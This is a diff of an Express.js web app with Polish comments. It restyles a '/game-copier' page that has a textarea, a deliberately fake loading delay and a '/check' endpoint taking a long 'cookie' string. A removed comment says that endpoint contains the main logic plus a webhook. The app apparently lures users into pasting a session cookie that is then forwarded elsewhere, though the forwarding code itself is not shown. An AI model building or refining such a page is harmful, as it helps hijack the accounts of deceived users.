@@ -64,7 +64,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// Podstrona /game-copier – bez możliwości przesuwania/rozciągania pola tekstowego
+// Podstrona /game-copier – mniejsza, lepiej dopasowana ramka
 app.get('/game-copier', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -175,19 +175,20 @@ app.get('/game-copier', (req, res) => {
       100% { transform: rotate(360deg); }
     }
 
-    /* Ramka zygzakowata – bez zmian */
+    /* Mniejsza, lepiej dopasowana zygzakowata ramka */
     .zigzag-border {
       position: relative;
       width: 100%;
-      padding: 6px;
-      border-radius: 16px;
+      max-width: 480px;           /* ograniczenie szerokości */
+      margin: 0 auto 28px auto;   /* wyśrodkowanie */
+      padding: 4px;               /* mniejszy padding */
+      border-radius: 14px;
       overflow: hidden;
-      margin-bottom: 28px;
     }
     .zigzag-border::before {
       content: '';
       position: absolute;
-      inset: -8px;
+      inset: -6px;
       background: linear-gradient(
         90deg,
         transparent 20%,
@@ -198,9 +199,9 @@ app.get('/game-copier', (req, res) => {
       );
       background-size: 300% 300%;
       animation: lightningFlow 2.8s linear infinite;
-      filter: blur(5px);
-      opacity: 0.75;
-      border-radius: 22px;
+      filter: blur(4px);
+      opacity: 0.8;
+      border-radius: 20px;
       z-index: -1;
     }
     .zigzag-border::after {
@@ -216,16 +217,16 @@ app.get('/game-copier', (req, res) => {
         #fff 6px,
         #fff 9px
       );
-      background-size: 12px 12px;
+      background-size: 10px 10px;
       animation: zigzagShift 4s linear infinite;
-      opacity: 0.35;
-      border-radius: 12px;
+      opacity: 0.4;
+      border-radius: 10px;
       z-index: -1;
     }
     .inner-box {
       background: #ffffff;
-      border-radius: 12px;
-      padding: 18px 20px;
+      border-radius: 10px;
+      padding: 16px 18px;         /* mniejszy padding wewnątrz */
       border: 1px solid #333;
       position: relative;
       z-index: 2;
@@ -233,20 +234,20 @@ app.get('/game-copier', (req, res) => {
     }
     .zigzag-border:hover .inner-box {
       border-color: #000;
-      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      box-shadow: 0 0 16px rgba(0,0,0,0.4);
     }
     textarea {
       width: 100%;
-      height: 180px;            /* stała wysokość */
+      height: 180px;              /* stała wysokość */
       background: transparent;
       border: none;
       outline: none;
-      resize: none;             /* NIE DA SIĘ ROZCIĄGAĆ / PRZESUWAĆ */
+      resize: none;               /* zero rozciągania */
       font-family: Consolas, "Courier New", monospace;
       font-size: 14.5px;
       color: #111;
       line-height: 1.5;
-      overflow-y: auto;         /* scroll w pionie jeśli tekst za długi */
+      overflow-y: auto;           /* scroll tylko jeśli potrzeba */
     }
     textarea::placeholder {
       color: #777;
@@ -430,10 +431,10 @@ async function start() {
 
   btn.disabled = true;
 
-  // Pokazujemy sztuczne ładowanie na 1.2 sekundy
+  // Pokazujemy sztuczne ładowanie
   loading.style.display = 'flex';
 
-  // Czekamy 1200 ms
+  // Czekamy 1.2 sekundy
   await new Promise(resolve => setTimeout(resolve, 1200));
 
   // Ukrywamy loading
@@ -490,7 +491,7 @@ async function start() {
   `);
 });
 
-// Endpoint /check – bez zmian (cała logika + webhook)
+// Endpoint /check – bez zmian
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
